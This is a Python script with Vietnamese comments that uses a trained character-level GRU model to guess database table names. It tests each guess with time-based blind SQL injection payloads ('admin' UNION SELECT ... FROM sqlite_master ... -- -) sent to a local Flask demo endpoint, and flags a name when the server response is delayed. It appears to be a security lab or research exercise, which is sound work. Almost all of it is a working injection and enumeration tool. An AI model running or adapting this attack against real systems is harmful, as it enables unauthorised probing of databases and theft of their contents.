import os
import time
import numpy as np
import requests
import tensorflow as tf
from urllib.parse import quote_plus

# ================== CONFIG ==================

DATA_DIR = os.path.join("data")

# ĐIỀU QUAN TRỌNG:
# Đặt đúng tên file model mà ông export từ Colab về.
# Ví dụ: "blind_sqli_gru_best.h5" hoặc "blind_sqli_gru_model.h5"
MODEL_PATH = os.path.join("trained_models", "blind_sqli_gru_model.h5")

# Target: Flask demo time-based endpoint
TARGET = "http://127.0.0.1:5000/time"
PARAM = "username"
DELAY = 4.0  # TIME_DELAY trong app.py

SEQ_LENGTH = 20


# ================== LOAD VOCAB ==================

def load_vocab():
    """Build vocab từ data giống y lúc train."""
    names = set()
    for path in (
        os.path.join(DATA_DIR, "common-tables.txt"),
        os.path.join(DATA_DIR, "common-columns.txt"),
    ):
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    names.add(line)
    text = "\n".join(sorted(names)) + "\n"
    vocab = sorted(set(text))
    return vocab, text


vocab, text = load_vocab()
char2idx = {c: i for i, c in enumerate(vocab)}
idx2char = {i: c for i, c in enumerate(vocab)}


# ================== LOAD MODEL (KHÔNG FALLBACK) ==================

def load_model_strict():
    """
    Chỉ load đúng file .h5 đã train từ Colab.
    - Không tự train lại.
    - Nếu load fail thì dừng hẳn (SystemExit).
    """
    print(f"[+] Đang cố gắng load model từ: {MODEL_PATH}")

    if not os.path.exists(MODEL_PATH):
        raise SystemExit(
            f"[X] Không tìm thấy file model: {MODEL_PATH}\n"
            f"    -> Nhớ copy file .h5 từ Colab về đúng đường dẫn."
        )

    try:
        # Keras 3: có tham số safe_mode
        model = tf.keras.models.load_model(MODEL_PATH, compile=False, safe_mode=False)
    except TypeError:
        # Keras 2.x: không có safe_mode
        model = tf.keras.models.load_model(MODEL_PATH, compile=False)
    except Exception as e:
        raise SystemExit(
            f"[X] Load model .h5 thất bại: {e}\n"
            f"    -> Đây là script đánh giá, nên tắt luôn chứ không tự train lại.\n"
            f"    -> Kiểm tra lại version TensorFlow/Keras và file .h5."
        )

    print("[+] Load model thành công, đang dùng đúng GRU đã train từ Colab.")
    return model


model = load_model_strict()


# ================== SINH TÊN BẰNG GRU ==================

def generate_name(max_len=20, temperature=0.8):
    """
    Sinh tên bảng/column mới từ model GRU, char-level.
    Bắt đầu từ '\n' cho giống phân phối lúc train.
    """
    sequence = [char2idx["\n"]]
    name = ""

    for _ in range(max_len):
        x = np.array([sequence])
        preds = model.predict(x, verbose=0)[0]

        # Temperature sampling
        probs = np.asarray(preds).astype("float64")
        probs = np.log(probs + 1e-9) / max(temperature, 1e-3)
        probs = np.exp(probs) / np.sum(np.exp(probs))

        next_idx = np.random.choice(len(probs), p=probs)
        next_char = idx2char[next_idx]

        if next_char == "\n":
            break

        name += next_char
        sequence.append(next_idx)

    return name


# ================== BUILD PAYLOAD VÀ GỬI REQUEST ==================

def build_sqlite_time_payload(table_name: str) -> str:
    """
    Tận dụng query tại /time: SELECT * FROM users WHERE username = '{payload}'
    Chèn UNION để nếu bảng tồn tại sẽ trả về ít nhất 1 dòng → server sleep.
    """
    injected = (
        f"admin' UNION SELECT 1,'{table_name}','p','r' "
        f"FROM sqlite_master WHERE name='{table_name}' -- -"
    )
    return injected


def send_payload(payload: str) -> float:
    try:
        t1 = time.time()
        requests.get(
            f"{TARGET}?{PARAM}={quote_plus(payload)}",
            timeout=DELAY + 2,
        )
        t2 = time.time()
        return t2 - t1
    except requests.exceptions.Timeout:
        # Timeout coi như đạt ngưỡng delay
        return DELAY


# ================== MAIN ==================

def main():
    print(f"[+] Target: {TARGET}?{PARAM}=<payload>")
    print("[+] Đang dùng model GRU đã train sẵn để sinh tên bảng/column và test time-based...")

    for i in range(20):
        name = generate_name()
        payload = build_sqlite_time_payload(name)
        t = send_payload(payload)
        print(f"[{i+1:02}] '{name}' -> {t:.2f}s")
        if t >= DELAY:
            print(f"[+] Nghi ngờ bảng tồn tại hoặc payload gây trễ: {name}")
            break
    else:
        print("[!] Hết 20 lần thử nhưng chưa có dấu hiệu trễ rõ ràng.")


if __name__ == "__main__":
    main()
